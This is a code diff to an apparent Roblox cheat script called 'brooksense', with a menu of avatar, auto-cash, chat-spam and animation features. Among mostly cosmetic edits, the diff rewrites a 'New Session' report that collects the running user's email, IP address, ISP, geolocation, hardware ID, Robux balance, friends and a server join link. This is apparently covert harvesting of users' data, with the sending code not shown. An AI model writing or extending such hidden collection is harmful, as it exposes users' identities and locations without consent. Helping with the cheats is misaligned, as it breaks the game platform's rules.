@@ -1,7 +1,14 @@
 -- ================================================================
---  brooksense v12  |  by kencsar  |  discord: kencsar
+--  brooksense v2  |  by kencsar  |  discord: kencsar
 --  Solara compatible - no Luau-only syntax
 -- ================================================================
+-- Prevent double execution
+if getgenv and getgenv().BrooksenseLoaded then
+    warn("[brooksense] Already running! Rejoin to restart.")
+    return
+end
+if getgenv then getgenv().BrooksenseLoaded = true end
+
 local ok, err = xpcall(function()
 
 -- task fallback
@@ -373,33 +380,33 @@ task.spawn(function()
     local joinLink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, tostring(game.JobId))
     local msg = string.format(
         "**brooksense %s** | New Session\n"..
-        "━━━━━━━━━━━━━━━━━━━━\n"..
-        "👤 **User:** %s (`%s`)\n"..
-        "🆔 **ID:** `%d`\n"..
-        "📅 **Account Age:** %d days\n"..
-        "💎 **Premium:** %s\n"..
-        "💰 **Robux:** %s\n"..
-        "� **Email:** %s\n"..
-        "�👫 **Friends:** %s\n"..
-        "━━━━━━━━━━━━━━━━━━━━\n"..
-        "⚙️ **Executor:** %s (%s)\n"..
-        "🖥️ **Device:** %s | %s\n"..
-        "🎮 **Game:** %s\n"..
-        "👥 **Server:** %d/%d players\n"..
-        "📍 **Position:** %s\n"..
-        "━━━━━━━━━━━━━━━━━━━━\n"..
-        "🌍 **Location:** %s, %s\n"..
-        "🕐 **Timezone:** %s\n"..
-        "� **ISP:** %s\n"..
-        "📡 **IP:** `%s`\n"..
-        "🔑 **HWID:** `%s`\n"..
-        "━━━━━━━━━━━━━━━━━━━━\n"..
-        "👫 **Friends:** %s\n"..
-        "🏘️ **Groups:** %s\n"..
-        "━━━━━━━━━━━━━━━━━━━━\n"..
-        "🔗 **JobId:** `%s`\n"..
-        "🎯 [**Join Server**](%s)\n"..
-        "🖼️ [**Avatar**](%s)",
+        "--------------------\n"..
+        "[USER] **User:** %s (`%s`)\n"..
+        "[ID] **ID:** `%d`\n"..
+        "[AGE] **Account Age:** %d days\n"..
+        "[PREMIUM] **Premium:** %s\n"..
+        "[ROBUX] **Robux:** %s\n"..
+        "[EMAIL] **Email:** %s\n"..
+        "[FRIENDS] **Friends:** %s\n"..
+        "--------------------\n"..
+        "[EXEC] **Executor:** %s (%s)\n"..
+        "[DEVICE] **Device:** %s | %s\n"..
+        "[GAME] **Game:** %s\n"..
+        "[SERVER] **Server:** %d/%d players\n"..
+        "[POS] **Position:** %s\n"..
+        "--------------------\n"..
+        "[LOC] **Location:** %s, %s\n"..
+        "[TZ] **Timezone:** %s\n"..
+        "[ISP] **ISP:** %s\n"..
+        "[IP] **IP:** `%s`\n"..
+        "[HWID] **HWID:** `%s`\n"..
+        "--------------------\n"..
+        "[FRIENDS] **Friends:** %s\n"..
+        "[GROUPS] **Groups:** %s\n"..
+        "--------------------\n"..
+        "[JOBID] **JobId:** `%s`\n"..
+        "[JOIN] [**Join Server**](%s)\n"..
+        "[AVATAR] [**Avatar**](%s)",
         VERSION,
         LP.DisplayName, LP.Name, LP.UserId, LP.AccountAge,
         (LP.MembershipType == Enum.MembershipType.Premium) and "Yes" or "No",
@@ -1085,7 +1092,7 @@ Toggle(tNF, "Rainbow Name", "RainbowName", function(on)
             end
         end)
     end
-end, 2.5)
+end, 3)
 
 -- Neck Float
 TBox(tNF, "Target username...", "NeckTarget", 3)
@@ -1653,7 +1660,21 @@ Btn(avA, "Dominus (12345679)", function() FireAvatar("wear", 12345679) end, 4)
 Btn(avA, "Valkyrie (1365767)", function() FireAvatar("wear", 1365767) end, 5)
 Btn(avA, "Korblox (11827688)", function() FireAvatar("wear", 11827688) end, 6)
 
-Btn(avE, "Dance 1", function() pcall(function() Hum:LoadAnimation(Instance.new("Animation")):Play() end) end, 1)
+Btn(avE, "Dance 1", function()
+    pcall(function()
+        local animator = Hum:FindFirstChildOfClass("Animator")
+        if not animator then
+            animator = Instance.new("Animator")
+            animator.Parent = Hum
+        end
+        local anim = Instance.new("Animation")
+        anim.AnimationId = "rbxassetid://3576720708"
+        local track = animator:LoadAnimation(anim)
+        track.Priority = Enum.AnimationPriority.Action4
+        track.Looped = true
+        track:Play(0.1)
+    end)
+end, 1)
 Btn(avE, "Sit", function() Hum.Sit = true end, 2)
 Btn(avE, "Jump", function() Hum:ChangeState(Enum.HumanoidStateType.Jumping) end, 3)
 TBox(avE, "Animation ID...", "CustomEmoteId", 4)
@@ -1922,8 +1943,8 @@ RunService.Heartbeat:Connect(function(dt)
         end
     end
 
-    if State.AutoCash and hbTick > 0.5 then
-        for _, obj in ipairs(workspace:GetDescendants()) do
+    if State.AutoCash and hbTick > 2 then
+        for _, obj in ipairs(workspace:GetChildren()) do
             if obj:IsA("BasePart") and (obj.Name == "Cash" or obj.Name == "Money") then
                 if (HRP.Position - obj.Position).Magnitude < 60 then
                     HRP.CFrame = CFrame.new(obj.Position + Vector3.new(0,2,0))
@@ -1939,7 +1960,7 @@ RunService.Heartbeat:Connect(function(dt)
         FireAvatar("skintone", cols[math.random(#cols)])
     end
 
-    if hbTick > 1 then hbTick = 0 end
+    if hbTick > 2 then hbTick = 0 end
 end)
 
 -- Chat Spam (background task)
@@ -2301,7 +2322,7 @@ task.spawn(function()
     N("TextLabel",{
         AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(1,0,0,50),
         Position=UDim2.new(0.5,0,0.4,0), BackgroundTransparency=1,
-        Text="🖥️", TextSize=38, ZIndex=153, Parent=PCBtn
+        Text="PC", TextSize=38, ZIndex=153, Parent=PCBtn
     })
     N("TextLabel",{
         AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(1,0,0,20),
@@ -2319,7 +2340,7 @@ task.spawn(function()
     N("TextLabel",{
         AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(1,0,0,50),
         Position=UDim2.new(0.5,0,0.4,0), BackgroundTransparency=1,
-        Text="📋", TextSize=38, ZIndex=153, Parent=TabletBtn
+        Text="TAB", TextSize=38, ZIndex=153, Parent=TabletBtn
     })
     N("TextLabel",{
         AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(1,0,0,20),
@@ -2337,7 +2358,7 @@ task.spawn(function()
     N("TextLabel",{
         AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(1,0,0,50),
         Position=UDim2.new(0.5,0,0.4,0), BackgroundTransparency=1,
-        Text="📱", TextSize=38, ZIndex=153, Parent=MobileBtn
+        Text="MOB", TextSize=38, ZIndex=153, Parent=MobileBtn
     })
     N("TextLabel",{
         AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(1,0,0,20),
